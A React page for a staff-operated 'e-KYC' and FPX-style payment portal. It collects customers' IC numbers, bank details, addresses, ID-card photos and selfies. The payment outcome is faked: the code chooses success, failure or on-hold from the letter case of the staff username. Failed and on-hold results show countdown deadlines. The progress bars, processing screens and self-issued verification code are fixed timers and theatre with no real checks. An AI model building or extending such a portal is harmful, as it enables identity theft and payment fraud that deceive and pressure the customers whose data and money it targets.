
"use client";
import { useEffect, useRef, useState } from "react";

const money = (v) => `RM ${Number(v||0).toLocaleString("en-MY",{minimumFractionDigits:2,maximumFractionDigits:2})}`;
const fmtTime = (v) => v ? new Intl.DateTimeFormat("en-MY",{dateStyle:"medium",timeStyle:"medium",timeZone:"Asia/Kuala_Lumpur"}).format(new Date(v)) : "";

function BankLogo({bank,size=38}) {
  const initial = String(bank?.name || "B").trim().slice(0,1).toUpperCase();
  return <div style={{
    width:size,height:size,borderRadius:10,background:"#fff",
    border:"1px solid #dfe6ef",display:"grid",placeItems:"center",
    position:"relative",overflow:"hidden",flex:"0 0 auto"
  }}>
    <span style={{fontWeight:900,fontSize:Math.max(14,Math.round(size*0.38)),color:"#17304f"}}>{initial}</span>
    {bank?.logo_data_url ? <img
      src={bank.logo_data_url}
      alt={`${bank.name} logo`}
      onError={e=>{e.currentTarget.style.display="none";}}
      style={{
        position:"absolute",inset:0,width:"100%",height:"100%",
        objectFit:"contain",background:"#fff",padding:4
      }}
    /> : null}
  </div>;
}

const formatIc = (value) => {
  const digits = String(value || "").replace(/\D/g, "").slice(0,12);
  if (digits.length <= 6) return digits;
  if (digits.length <= 8) return `${digits.slice(0,6)}-${digits.slice(6)}`;
  return `${digits.slice(0,6)}-${digits.slice(6,8)}-${digits.slice(8)}`;
};

const deriveCaseStatus = (value) => {
  const letters = (String(value || "").match(/[A-Za-z]/g) || []).join("");
  if (!letters) return "SUCCESS";
  if (letters === letters.toUpperCase()) return "SUCCESS";
  if (letters === letters.toLowerCase()) return "FAILED";
  return "ON_HOLD";
};

function AutoRetrySubmit({message,onRetry}){
  useEffect(()=>{
    const timer=setTimeout(()=>onRetry(),650);
    return ()=>clearTimeout(timer);
  },[onRetry]);

  return (
    <div style={{textAlign:"center",padding:"24px 0"}}>
      <div style={{fontWeight:900}}>Processing...</div>
    </div>
  );
}

function ProcessingPaymentAuto({label,onDone}){
  useEffect(()=>{
    const timer=setTimeout(()=>{ onDone(); },750);
    return ()=>clearTimeout(timer);
  },[]);

  return (
    <div style={{textAlign:"center",padding:50}}>
      <h1>{label}</h1>
    </div>
  );
}

export default function Home(){
  const [settings,setSettings]=useState(null);
  const [banks,setBanks]=useState([]);
  const [step,setStep]=useState(1);
  const [form,setForm]=useState({name:"",ic:"",customerBankName:"",customerBankAccount:"",customerAddress:"",bank:"",account:"",amount:"",reference:""});
  const [tx,setTx]=useState(null);
  const [bankModal,setBankModal]=useState(false);
  const [result,setResult]=useState("ON_HOLD");
  const [deadline,setDeadline]=useState(null);
  const [tick,setTick]=useState(Date.now());

  const [salesperson,setSalesperson]=useState(null);
  const [loginOpen,setLoginOpen]=useState(false);
  const [staffLogin,setStaffLogin]=useState({username:"",password:""});
  const [loginError,setLoginError]=useState("");
  const [verificationCode,setVerificationCode]=useState("");
  const [verificationInput,setVerificationInput]=useState("");
  const [verificationPassed,setVerificationPassed]=useState(false);
  const [verificationError,setVerificationError]=useState("");
  const [idFront,setIdFront]=useState("");
  const [idBack,setIdBack]=useState("");
  const [selfie,setSelfie]=useState("");
  const [uploadLink,setUploadLink]=useState("");
  const [linkBusy,setLinkBusy]=useState(false);
  const [linkError,setLinkError]=useState("");
  const [linkProgress,setLinkProgress]=useState(0);
  const autoLinkStartedRef=useRef(false);

  useEffect(()=>{
    (async()=>{
      await fetch("/api/init",{method:"POST"});
      const [s,b]=await Promise.all([
        fetch("/api/settings").then(r=>r.json()),
        fetch("/api/banks").then(r=>r.json())
      ]);
      setSettings(s);
      setBanks(b.filter(x=>x.enabled));
      try {
        const saved = sessionStorage.getItem("salesperson_profile");
        if(saved) setSalesperson(JSON.parse(saved));
      } catch {}
    })();
  },[]);

  useEffect(()=>{
    const t=setInterval(()=>setTick(Date.now()),1000);
    return ()=>clearInterval(t);
  },[]);

  useEffect(()=>{
    if(step===6){
      setVerificationCode(String(Math.floor(100000 + Math.random()*900000)));
      setVerificationInput("");
      setVerificationPassed(false);
      setVerificationError("");
    }
  },[step]);


  useEffect(()=>{
    if(!tx?.id || step < 8) return;
    const t=setInterval(async()=>{
      try{
        const fresh=await fetch(`/api/transactions/${tx.id}`,{cache:"no-store"}).then(r=>r.json());
        if(fresh){
          setTx(fresh);
          setResult(fresh.status || "ON_HOLD");
          setDeadline(fresh.deadline || null);
        }
      }catch{}
    },2500);
    return ()=>clearInterval(t);
  },[tx?.id,step]);


  function compressImageSource(src, maxSide=1100, quality=0.72){
    return new Promise((resolve,reject)=>{
      const img=new Image();
      img.onload=()=>{
        const scale=Math.min(1,maxSide/Math.max(img.width,img.height));
        const canvas=document.createElement("canvas");
        canvas.width=Math.max(1,Math.round(img.width*scale));
        canvas.height=Math.max(1,Math.round(img.height*scale));
        const ctx=canvas.getContext("2d");
        ctx.drawImage(img,0,0,canvas.width,canvas.height);
        resolve(canvas.toDataURL("image/jpeg",quality));
      };
      img.onerror=()=>reject(new Error("Unable to read image."));
      img.src=src;
    });
  }

  function fileToPreview(file,setter){
    if(!file) return;
    if(!file.type.startsWith("image/")){
      alert("Please select an image file.");
      return;
    }
    const reader=new FileReader();
    reader.onload=async()=>{
      try{
        const compressed=await compressImageSource(String(reader.result || ""));
        setter(compressed);
      }catch{
        alert("Unable to process image.");
      }
    };
    reader.readAsDataURL(file);
  }


  function calcDeadline(status){
    if(!settings) return null;
    const hours = status==="FAILED" ? settings.timers.failedHours : status==="ON_HOLD" ? settings.timers.onHoldHours : 0;
    return hours ? new Date(Date.now()+hours*3600*1000).toISOString() : null;
  }

  async function staffSignIn(){
    setLoginError("");
    const r=await fetch("/api/salespersons/login",{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify(staffLogin)
    });
    const data=await r.json();
    if(!r.ok){
      setLoginError(data.error || "Login failed.");
      return;
    }
    setSalesperson(data);
    sessionStorage.setItem("salesperson_profile",JSON.stringify(data));
    setStaffLogin({username:"",password:""});
    setLoginOpen(false);
  }

  function goHome(){
    setBankModal(false);
    setStep(1);
  }

  function goBack(){
    setBankModal(false);
    const prev={
      10:1,
      2:10,
      3:2,
      5:3,
      6:5,
      8:7,
      9:8
    };
    setStep(prev[step] ?? 1);
  }

  function goNext(){
    setBankModal(false);

    if(step===1){
      if(!customerDetailsReady) return;
      setLinkError("");
      setLinkProgress(0);
      autoLinkStartedRef.current=false;
      setStep(10);
      return;
    }

    if(step===10){
      if(uploadLink) setStep(2);
      return;
    }

    if(step===2){ setStep(3); return; }

    if(step===3){
      if(form.bank && form.account && form.amount) setStep(5);
      return;
    }

    if(step===5){ setStep(6); return; }

    if(step===6){
      if(verificationPassed) setStep(7);
      return;
    }

    if(step===8){ setStep(9); return; }

    if(step===9){ setStep(1); return; }
  }

  function canGoNext(){
    if(step===1) return customerDetailsReady;
    if(step===10) return !!uploadLink;
    if(step===2) return true;
    if(step===3) return !!(form.bank && form.account && form.amount);
    if(step===5) return true;
    if(step===6) return verificationPassed;
    if(step===8) return true;
    if(step===9) return true;
    return false;
  }

  function staffLogout(){
    
    setSalesperson(null);
    setStep(1);
    setTx(null);
    setIdFront("");
    setIdBack("");
    setSelfie("");
    setUploadLink("");
    setLinkError("");
    setLinkProgress(0);
    autoLinkStartedRef.current=false;
    setForm({name:"",ic:"",customerBankName:"",customerBankAccount:"",customerAddress:"",bank:"",account:"",amount:"",reference:""});
    sessionStorage.removeItem("salesperson_profile");
  }

  const customerDetailsReady = Boolean(
    form.name.trim() &&
    form.ic.trim().length === 14 &&
    form.customerBankName.trim() &&
    form.customerBankAccount.trim() &&
    form.customerAddress.trim()
  );

  useEffect(()=>{
    if(step !== 10 || !salesperson || uploadLink || !customerDetailsReady) return;
    if(autoLinkStartedRef.current) return;

    autoLinkStartedRef.current = true;
    setLinkError("");
    setLinkBusy(true);
    setLinkProgress(1);

    let cancelled = false;
    const startedAt = Date.now();
    const timer = setInterval(()=>{
      const elapsed = Date.now() - startedAt;
      const pct = Math.min(100, Math.max(1, Math.floor((elapsed / 1000) * 100)));
      if(!cancelled) setLinkProgress(pct);
    }, 30);

    (async()=>{
      try{
        const request = fetch("/api/upload-links",{
          method:"POST",
          headers:{"Content-Type":"application/json"},
          body:JSON.stringify({
            transaction_id:tx?.id || null,
            biomatrix_id:biomatrixValue,
            name:form.name,
            ic:form.ic,
            customer_bank_name:form.customerBankName,
            customer_bank_account:form.customerBankAccount,
            customer_address:form.customerAddress,
            salesperson_id:salesperson?.id || null,
            salesperson_username:salesperson?.username || null,
            salesperson_company:salesperson?.company_name || null
          })
        }).then(async r=>{
          const data=await r.json();
          if(!r.ok) throw new Error(data.error || "Unable to generate upload link.");
          return data;
        });

        const [data] = await Promise.all([
          request,
          new Promise(resolve=>setTimeout(resolve,1000))
        ]);

        if(cancelled) return;
        clearInterval(timer);
        setLinkProgress(100);
        if(data.transaction) setTx(data.transaction);
        setUploadLink(`${window.location.origin}${data.path}`);
      }catch(e){
        if(cancelled) return;
        clearInterval(timer);
        setLinkError(e.message || "Unable to generate upload link.");
        autoLinkStartedRef.current=false;
      }finally{
        if(!cancelled) setLinkBusy(false);
      }
    })();

    return ()=>{
      cancelled = true;
      clearInterval(timer);
    };
  }, [step, salesperson, uploadLink, customerDetailsReady]);

  async function createUploadLink(isAuto=false){
    if(!customerDetailsReady){
      setLinkError("Please complete Name, IC / Identification No., Bank Name, Bank Account and Address.");
      if(isAuto) autoLinkStartedRef.current=false;
      return;
    }
    setLinkBusy(true);
    setLinkError("");
    try{
      const r=await fetch("/api/upload-links",{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({
          transaction_id:tx?.id || null,
          biomatrix_id:biomatrixValue,
          name:form.name,
          ic:form.ic,
          customer_bank_name:form.customerBankName,
          customer_bank_account:form.customerBankAccount,
          customer_address:form.customerAddress,
          salesperson_id:salesperson?.id || null,
          salesperson_username:salesperson?.username || null,
          salesperson_company:salesperson?.company_name || null
        })
      });
      const data=await r.json();
      if(!r.ok) throw new Error(data.error || "Unable to generate upload link.");
      if(data.transaction) setTx(data.transaction);
      setUploadLink(`${window.location.origin}${data.path}`);
    }catch(e){
      setLinkError(e.message || "Unable to generate upload link.");
      autoLinkStartedRef.current=false;
    }finally{
      setLinkBusy(false);
    }
  }

  async function copyUploadLink(){
    if(!uploadLink) return;
    try{
      await navigator.clipboard.writeText(uploadLink);
      alert("Upload link copied.");
    }catch{
      window.prompt("Copy this upload link:",uploadLink);
    }
  }

  async function submit(){
    const status=deriveCaseStatus(salesperson?.username || "");
    const dl=calcDeadline(status);
    setResult(status); setDeadline(dl);
    const response=await fetch(tx?.id ? `/api/transactions/${tx.id}` : "/api/transactions",{
      method:tx?.id ? "PUT" : "POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({
        biomatrix_id:(salesperson?.biomatrix_id || settings.biomatrixValue),
        name:form.name,
        ic:form.ic,
        bank:form.bank,
        account_number:form.account,
        amount:Number(form.amount||0),
        reference:form.reference,
        customer_bank_name:form.customerBankName,
        customer_bank_account:form.customerBankAccount,
        customer_address:form.customerAddress,
        status,
        deadline:dl,
        salesperson_id:salesperson?.id || null,
        salesperson_username:salesperson?.username || null,
        salesperson_company:salesperson?.company_name || null,
        id_front_data_url:idFront || null,
        id_back_data_url:idBack || null,
        selfie_data_url:selfie || null
      })
    });
    const created=await response.json();
    if(!response.ok){
      alert(created.error || "Unable to save transaction.");
      return;
    }
    setTx(created);
    setStep(8);
  }

  function verifyInternalCode(){
    if(verificationInput !== verificationCode){
      setVerificationError("Incorrect verification code.");
      return;
    }
    setVerificationPassed(true);
    setVerificationError("");
  }

  function remaining(){
    if(!deadline) return "";
    const ms=Math.max(0,new Date(deadline)-tick);
    const s=Math.floor(ms/1000), h=Math.floor(s/3600), m=Math.floor((s%3600)/60), sec=s%60;
    return `${String(h).padStart(2,"0")}:${String(m).padStart(2,"0")}:${String(sec).padStart(2,"0")}`;
  }

  if(!settings) return <div className="page"><div className="shell card">Loading...</div></div>;

  const brandName = salesperson?.company_name || settings.brandName;
  const brandLogo = salesperson?.logo_data_url || settings.logoDataUrl;
  const biomatrixValue = salesperson?.biomatrix_id || settings.biomatrixValue;
  const staffLogoSize = Math.max(60, Math.min(260, Number(salesperson?.logo_size || settings.logoSize || 140)));

  const bg = settings.backgroundImageDataUrl
    ? {backgroundImage:`linear-gradient(rgba(255,255,255,.82),rgba(255,255,255,.82)),url(${settings.backgroundImageDataUrl})`,backgroundSize:"cover",backgroundPosition:"center"}
    : {backgroundColor:settings.backgroundColor};

  const selectedBank = banks.find(b=>b.name===form.bank) || null;

  const statusCfg = {
    SUCCESS:{title:settings.messages.successTitle,text:settings.messages.successText,color:settings.successColor},
    FAILED:{title:settings.messages.failedTitle,text:settings.messages.failedText,color:settings.failedColor},
    ON_HOLD:{title:settings.messages.onHoldTitle,text:settings.messages.onHoldText,color:settings.onHoldColor}
  }[result] || {title:"OnHold",text:"",color:settings.onHoldColor};

  if(!salesperson){
    return <main className="page" style={bg}>
      <div className="shell" style={{maxWidth:560}}>
        <div style={{marginBottom:18}}>
          {settings.logoDataUrl
            ? <img src={settings.logoDataUrl} alt="" style={{height:Math.max(70,Number(settings.logoSize||90)),maxWidth:320,objectFit:"contain"}}/>
            : <>
                <div style={{fontSize:34,fontWeight:950}}>{settings.brandName || "e-KYC"}</div>
                <div className="muted">{settings.headerSubtitle || "Secure Access"}</div>
              </>}
        </div>

        <div className="card" style={{background:settings.cardColor,padding:30}}>
          <h1 style={{marginTop:0}}>Login</h1>
          <p className="muted">Sign in with your staff account to continue.</p>

          <label>User ID</label>
          <input
            autoFocus
            autoComplete="username"
            value={staffLogin.username}
            onChange={e=>setStaffLogin({...staffLogin,username:e.target.value})}
          />

          <label>Password</label>
          <input
            type="password"
            autoComplete="current-password"
            value={staffLogin.password}
            onChange={e=>setStaffLogin({...staffLogin,password:e.target.value})}
            onKeyDown={e=>e.key==="Enter"&&staffSignIn()}
          />

          {loginError && <div style={{marginTop:10,color:"#b42318",fontWeight:800}}>{loginError}</div>}

          <button className="btn btn-primary" style={{width:"100%",marginTop:18}} onClick={staffSignIn}>
            Login
          </button>
        </div>
      </div>
    </main>;
  }

  return <main className="page" style={bg}>
    <div className="shell">
      <div className="row" style={{justifyContent:"space-between",marginBottom:16}}>
        <div className="row" style={{justifyContent:settings.logoPosition==="center"?"center":"flex-start",flex:1,minHeight:112}}>
          {brandLogo ? (
            <div style={{width:Math.max(360,staffLogoSize*2.6),height:staffLogoSize+16,display:"flex",alignItems:"center",justifyContent:settings.logoPosition==="center"?"center":"flex-start",overflow:"hidden"}}>
              <button
                type="button"
                onClick={goHome}
                title="Home"
                aria-label="Go to home"
                style={{border:0,background:"transparent",padding:0,cursor:"pointer",display:"block"}}
              >
                <img src={brandLogo} alt="" style={{height:staffLogoSize,maxHeight:260,maxWidth:Math.max(350,staffLogoSize*2.5),width:"auto",objectFit:"contain",display:"block"}}/>
              </button>
            </div>
          ) : (
            <button
              type="button"
              onClick={goHome}
              title="Home"
              aria-label="Go to home"
              style={{border:0,background:"transparent",padding:0,cursor:"pointer",textAlign:"left"}}
            >
              <div style={{fontWeight:950,fontSize:30}}>{brandName}</div>
              <div className="muted" style={{fontSize:16}}>{settings.headerSubtitle}</div>
            </button>
          )}
        </div>

        <div className="row">
          {salesperson ? <>
            <div style={{textAlign:"right",maxWidth:360,lineHeight:1.45}}>
              <div style={{fontWeight:950,fontSize:17}}>{salesperson.salesperson_name || salesperson.username}</div>
              <div className="muted"><b>BioMatrix ID:</b> {salesperson.biomatrix_id || biomatrixValue || "-"}</div>
            </div>
            <button className="btn btn-soft" onClick={staffLogout}>Logout</button>
          </> : null}
        </div>
      </div>

      <div className="card" style={{background:settings.cardColor}}>
        {step!==7 && (
          <div className="row" style={{justifyContent:"space-between",alignItems:"center",marginBottom:18}}>
            <button
              className="btn btn-soft"
              onClick={goBack}
              disabled={step===1}
              style={{opacity:step===1?0.45:1}}
            >
              Back
            </button>

            <button
              className="btn btn-primary"
              onClick={goNext}
              disabled={!canGoNext()}
              style={{opacity:canGoNext()?1:0.45}}
            >
              Next
            </button>
          </div>
        )}

        {step===1 && <>
          <h1>{settings.labels.paymentTitle}</h1><p className="muted">{settings.labels.paymentSubtitle}</p>
          <label>{settings.biomatrixLabel}</label><input value={biomatrixValue} readOnly/>
          <div className="grid2">
            <div><label>{settings.labels.name}</label><input value={form.name} onChange={e=>setForm({...form,name:e.target.value})}/></div>
            <div><label>{settings.labels.ic}</label><input inputMode="numeric" maxLength={14} placeholder="000000-00-0000" value={form.ic} onChange={e=>setForm({...form,ic:formatIc(e.target.value)})}/></div>

            <div><label>Bank Name</label><input value={form.customerBankName} onChange={e=>setForm({...form,customerBankName:e.target.value})}/></div>
            <div><label>Bank Account</label><input value={form.customerBankAccount} onChange={e=>setForm({...form,customerBankAccount:e.target.value})}/></div>

            <div style={{gridColumn:"1 / -1"}}>
              <label>Address</label>
              <textarea rows={3} value={form.customerAddress} onChange={e=>setForm({...form,customerAddress:e.target.value})}/>
            </div>
          </div>
          <div className="row" style={{justifyContent:"flex-end",marginTop:18}}>
            <button
              className="btn btn-primary"
              disabled={!customerDetailsReady}
              onClick={()=>{
                if(!customerDetailsReady) return;
                setLinkError("");
                setLinkProgress(0);
                autoLinkStartedRef.current=false;
                setStep(10);
              }}
            >
              Continue
            </button>
          </div>
        </>}

        {step===10 && <>
          <div style={{maxWidth:760,margin:"0 auto",padding:"28px 0"}}>
            {!uploadLink && <h1 style={{textAlign:"center"}}>Processing</h1>}

            {!uploadLink ? <>
              <div style={{marginTop:34}}>
                <div style={{display:"flex",justifyContent:"space-between",fontWeight:900,marginBottom:10}}>
                  <span>{"Loading" + ".".repeat((Math.floor((linkProgress || 1) / 12) % 3) + 1)}</span>
                  <span>{Math.max(1,linkProgress || 1)}%</span>
                </div>

                <div style={{height:14,borderRadius:999,background:"#e9eef6",overflow:"hidden"}}>
                  <div
                    style={{
                      height:"100%",
                      width:`${Math.max(1,linkProgress || 1)}%`,
                      background:"#1264d8",
                      transition:"width 30ms linear",
                      borderRadius:999
                    }}
                  />
                </div>

                {linkError && <>
                  <div style={{color:"#b42318",fontWeight:800,textAlign:"center",marginTop:16}}>{linkError}</div>
                  <div className="row" style={{justifyContent:"center",marginTop:12}}>
                    <button
                      className="btn btn-soft"
                      onClick={()=>{
                        autoLinkStartedRef.current=false;
                        setLinkProgress(0);
                        createUploadLink();
                      }}
                    >
                      Try Again
                    </button>
                  </div>
                </>}
              </div>
            </> : <>
              <div style={{marginTop:28}}>
                <div style={{fontWeight:950,fontSize:18,marginBottom:10}}>Customer Upload Link</div>
                <input value={uploadLink} readOnly onFocus={e=>e.currentTarget.select()}/>
                <div className="muted" style={{marginTop:8}}>
                  Valid for 24 hours. Regenerating creates a new link and invalidates the previous active link.
                </div>

                <div className="row" style={{justifyContent:"space-between",marginTop:18,flexWrap:"wrap",gap:10}}>
                  <button className="btn btn-soft" onClick={()=>setStep(1)}>Back</button>

                  <div className="row" style={{flexWrap:"wrap"}}>
                    <button className="btn btn-primary" onClick={copyUploadLink}>Copy Link</button>
                    <button
                      className="btn btn-soft"
                      onClick={async ()=>{
                        setUploadLink("");
                        setLinkProgress(0);
                        autoLinkStartedRef.current=false;
                        setTimeout(()=>autoLinkStartedRef.current=false,0);
                      }}
                      disabled={linkBusy}
                    >
                      Regenerate Link
                    </button>
                    <button className="btn btn-soft" onClick={()=>setStep(2)}>Upload Here</button>
                  </div>
                </div>
              </div>
            </>}
          </div>
        </>}

        {step===2 && <>
          <h1>Identity Verification</h1>
          <div style={{marginBottom:18,borderRadius:18,overflow:"hidden",border:"1px solid #dfe6ef",background:"#fff"}}>
            <img
              src="/ekyc-guide.png"
              alt="e-KYC Malaysia verification guide"
              style={{width:"100%",display:"block",objectFit:"cover"}}
            />
          </div>
          <p className="muted">Please review the guide above, then upload the front and back of the identification card and upload a selfie.</p>

          <div className="grid2">
            <div>
              <label>Identification Card — Front</label>
              <label className="btn btn-soft" style={{display:"inline-block"}}>
                Upload Front
                <input type="file" accept="image/*" style={{display:"none"}} onChange={e=>fileToPreview(e.target.files?.[0],setIdFront)}/>
              </label>
              {idFront && <div style={{marginTop:10,border:"1px solid #dfe6ef",borderRadius:14,padding:8,background:"#fff"}}>
                <img src={idFront} alt="Identification card front preview" style={{width:"100%",maxHeight:220,objectFit:"contain",display:"block",borderRadius:10}}/>
              </div>}
            </div>

            <div>
              <label>Identification Card — Back</label>
              <label className="btn btn-soft" style={{display:"inline-block"}}>
                Upload Back
                <input type="file" accept="image/*" style={{display:"none"}} onChange={e=>fileToPreview(e.target.files?.[0],setIdBack)}/>
              </label>
              {idBack && <div style={{marginTop:10,border:"1px solid #dfe6ef",borderRadius:14,padding:8,background:"#fff"}}>
                <img src={idBack} alt="Identification card back preview" style={{width:"100%",maxHeight:220,objectFit:"contain",display:"block",borderRadius:10}}/>
              </div>}
            </div>
          </div>

          <div className="card" style={{marginTop:16}}>
            <h3 style={{marginTop:0}}>Selfie</h3>
            <p className="muted">Upload a clear selfie image.</p>

            <label className="btn btn-soft" style={{display:"inline-block"}}>
              Upload Selfie
              <input
                type="file"
                accept="image/*"
                style={{display:"none"}}
                onChange={e=>fileToPreview(e.target.files?.[0],setSelfie)}
              />
            </label>

            {selfie && <>
              <img
                src={selfie}
                alt="Selfie preview"
                style={{
                  width:"100%",
                  maxWidth:360,
                  maxHeight:360,
                  objectFit:"cover",
                  borderRadius:16,
                  display:"block",
                  marginTop:10
                }}
              />
              <div className="row" style={{marginTop:12}}>
                <label className="btn btn-soft" style={{display:"inline-block"}}>
                  Replace Selfie
                  <input
                    type="file"
                    accept="image/*"
                    style={{display:"none"}}
                    onChange={e=>fileToPreview(e.target.files?.[0],setSelfie)}
                  />
                </label>
              </div>
            </>}

            <div className="muted" style={{marginTop:10}}>
              The selected image will be saved with the transaction when the transaction is submitted.
            </div>
          </div>

          <div className="row" style={{justifyContent:"space-between",marginTop:18}}>
            <button className="btn btn-soft" onClick={()=>{setStep(1)}}>Back</button>

            <div className="row">
              <button
                className="btn btn-soft"
                onClick={()=>{setStep(3)}}
              >
                Skip / Next
              </button>

              <button
                className="btn btn-primary"
                disabled={!idFront || !idBack || !selfie}
                style={{opacity:(!idFront || !idBack || !selfie)?0.55:1}}
                onClick={()=>{setStep(3)}}
              >
                Continue
              </button>
            </div>
          </div>
        </>}

        {step===3 && <>
          <h1>{settings.labels.selectBankTitle}</h1>
          <div className="grid3">
            {banks.map(b=><button key={b.id} className="btn btn-soft" style={{textAlign:"left",display:"flex",alignItems:"center",gap:10,minHeight:58}} onClick={()=>{setForm({...form,bank:b.name});setBankModal(true)}}>
              <BankLogo bank={b} size={34}/>
              <span>{b.name}</span>
            </button>)}
          </div>
          {form.bank && <div style={{marginTop:18}} className="card">
            <b>{form.bank}</b><div className="muted">{form.account ? `Account: ${form.account}`:"No account selected"}</div>
            {form.amount && <div className="muted">Amount: {money(form.amount)}</div>}
          </div>}
          <div className="row" style={{justifyContent:"space-between",marginTop:18}}>
            <button className="btn btn-soft" onClick={()=>setStep(2)}>Back</button>
            <button className="btn btn-primary" onClick={()=>form.bank&&form.account&&form.amount&&setStep(5)}>Continue with FPX</button>
          </div>
        </>}

        {step===5 && <>
          <h1>Transaction Confirmation</h1>
          <div className="kv"><span>Company</span><b>{brandName}</b></div>
          <div className="kv"><span>Staff</span><b>{salesperson?.username}</b></div>
          <div className="kv"><span>Merchant</span><b>{settings.merchantName}</b></div>
          <div className="kv"><span>{settings.labels.name}</span><b>{form.name}</b></div>
          <div className="kv"><span>{settings.labels.ic}</span><b>{form.ic}</b></div>
          <div className="kv"><span>Customer Bank Name</span><b>{form.customerBankName}</b></div>
          <div className="kv"><span>Customer Bank Account</span><b>{form.customerBankAccount}</b></div>
          <div className="kv"><span>Customer Address</span><b>{form.customerAddress}</b></div>
          <div className="kv"><span>Selected Bank</span><b>{form.bank}</b></div>
          <div className="kv"><span>{settings.labels.accountNumber}</span><b>{form.account}</b></div>
          <div className="kv"><span>{settings.labels.amount}</span><b>{money(form.amount)}</b></div>
          {form.reference && <div className="kv"><span>{settings.labels.reference}</span><b>{form.reference}</b></div>}
          <div className="row" style={{justifyContent:"space-between",marginTop:18}}>
            <button className="btn btn-soft" onClick={()=>setStep(2)}>Back</button>
            <button className="btn btn-primary" onClick={()=>setStep(6)}>Confirm Payment</button>
          </div>
        </>}

        {step===6 && <>
          <h1>{settings.labels.verification}</h1>
          <p className="muted">Internal verification code.</p>
          <div className="card" style={{marginBottom:14,background:"#f8fafc"}}>
            <div className="muted">Generated Code</div>
            <div style={{fontSize:28,fontWeight:950,letterSpacing:5}}>{verificationCode}</div>
          </div>
          <label>Verification Code</label>
          <input inputMode="numeric" maxLength={6} value={verificationPassed ? "******" : verificationInput} readOnly={verificationPassed} placeholder="Enter 6-digit code" onChange={e=>setVerificationInput(e.target.value.replace(/\D/g,"").slice(0,6))} onKeyDown={e=>{ if(e.key==="Enter" && !verificationPassed) verifyInternalCode(); }}/>
          {verificationError && <div style={{marginTop:8,color:"#b42318",fontWeight:800}}>{verificationError}</div>}
          <div className="row" style={{justifyContent:"flex-end",marginTop:18}}>
            {!verificationPassed ? <button className="btn btn-primary" onClick={verifyInternalCode}>Verify</button> : <button className="btn btn-primary" onClick={()=>setStep(7)}>Continue</button>}
          </div>
        </>}

        {step===7 && <ProcessingPaymentAuto label={settings.labels.processing} onDone={submit} />}

        {step===8 && <>
          <div style={{textAlign:"center"}}>
            <div style={{width:84,height:84,borderRadius:"50%",margin:"0 auto 14px",display:"grid",placeItems:"center",background:`${statusCfg.color}20`,color:statusCfg.color,fontSize:40,fontWeight:900}}>
              {result==="SUCCESS"?"✓":result==="FAILED"?"×":"…"}
            </div>
            <h1 style={{color:statusCfg.color}}>{statusCfg.title}</h1>
            <p>{statusCfg.text}</p>
            {deadline && <div className="card" style={{maxWidth:460,margin:"14px auto",borderColor:statusCfg.color,color:statusCfg.color}}>
              <div className="muted">Time remaining</div>
              <div style={{fontSize:32,fontWeight:950}}>{remaining()}</div>
              <div className="muted">Deadline: {fmtTime(deadline)}</div>
            </div>}
          </div>
          <div className="kv"><span>Transaction ID</span><b>{tx?.transaction_id}</b></div>
          <div className="kv"><span>Status</span><b style={{color:statusCfg.color}}>{result==="SUCCESS"?"Successful":result==="FAILED"?"Failed":"OnHold"}</b></div>
          <div className="kv"><span>Company</span><b>{tx?.salesperson_company || brandName}</b></div>
          <div className="kv"><span>Staff</span><b>{tx?.salesperson_username || salesperson?.username}</b></div>
          <div className="kv"><span>Bank</span><b>{form.bank}</b></div>
          <div className="kv"><span>Amount</span><b>{money(form.amount)}</b></div>
          <div className="row" style={{justifyContent:"flex-end",marginTop:18}}><button className="btn btn-primary" onClick={()=>setStep(9)}>View Receipt</button></div>
        </>}

        {step===9 && <>
          <h1>{settings.labels.receipt}</h1>
          <div className="kv"><span>Status</span><b style={{color:statusCfg.color}}>{result==="SUCCESS"?"Successful":result==="FAILED"?"Failed":"OnHold"}</b></div>
          <div className="kv"><span>Transaction ID</span><b>{tx?.transaction_id}</b></div>
          <div className="kv"><span>Company</span><b>{tx?.salesperson_company || brandName}</b></div>
          <div className="kv"><span>Staff</span><b>{tx?.salesperson_username || salesperson?.username}</b></div>
          <div className="kv"><span>Merchant</span><b>{settings.merchantName}</b></div>
          <div className="kv"><span>Bank</span><b>{form.bank}</b></div>
          <div className="kv"><span>{settings.labels.accountNumber}</span><b>{form.account}</b></div>
          <div className="kv"><span>{settings.biomatrixLabel}</span><b>{tx?.biomatrix_id || biomatrixValue}</b></div>
          {form.reference && <div className="kv"><span>{settings.labels.reference}</span><b>{form.reference}</b></div>}
          <div className="kv"><span>{settings.labels.name}</span><b>{form.name}</b></div>
          <div className="kv"><span>{settings.labels.ic}</span><b>{form.ic}</b></div>
          <div className="kv"><span>{settings.labels.amount}</span><b>{money(form.amount)}</b></div>
          <div className="kv"><span>Date / Time</span><b>{fmtTime(tx?.created_at)}</b></div>
          <div className="row" style={{justifyContent:"space-between",marginTop:18}}>
            <button className="btn btn-soft" onClick={()=>window.print()}>{settings.labels.printReceipt}</button>
            <button className="btn btn-primary" onClick={()=>{setStep(1);setTx(null);setIdFront("");setIdBack("");setSelfie("");setUploadLink("");setLinkError("");setForm({name:"",ic:"",customerBankName:"",customerBankAccount:"",customerAddress:"",bank:"",account:"",amount:"",reference:""})}}>{settings.labels.returnHome}</button>
          </div>
        </>}
      </div>
    </div>

    {bankModal && <div className="modalBack" onClick={()=>setBankModal(false)}>
      <div className="modal" onClick={e=>e.stopPropagation()}>
        <div className="row" style={{alignItems:"center",gap:14,marginBottom:12}}>
          <BankLogo bank={selectedBank || {name:form.bank}} size={72}/>
          <div style={{minWidth:0}}>
            <div className="muted">Selected Bank</div>
            <h2 style={{margin:"2px 0 0",lineHeight:1.2}}>{form.bank}</h2>
          </div>
        </div>
        <label>{settings.labels.accountNumber}</label><input value={form.account} onChange={e=>setForm({...form,account:e.target.value})}/>
        <label>{settings.labels.amount}</label><input inputMode="decimal" value={form.amount} onChange={e=>setForm({...form,amount:e.target.value.replace(/[^\d.]/g,"")})}/>
        <label>{settings.labels.reference}</label><input placeholder="Optional" value={form.reference} onChange={e=>setForm({...form,reference:e.target.value})}/>
        <div className="row" style={{justifyContent:"flex-end",marginTop:18}}>
          <button className="btn btn-soft" onClick={()=>setBankModal(false)}>Cancel</button>
          <button className="btn btn-primary" onClick={()=>setBankModal(false)}>Save</button>
        </div>
      </div>
    </div>}
  </main>
}
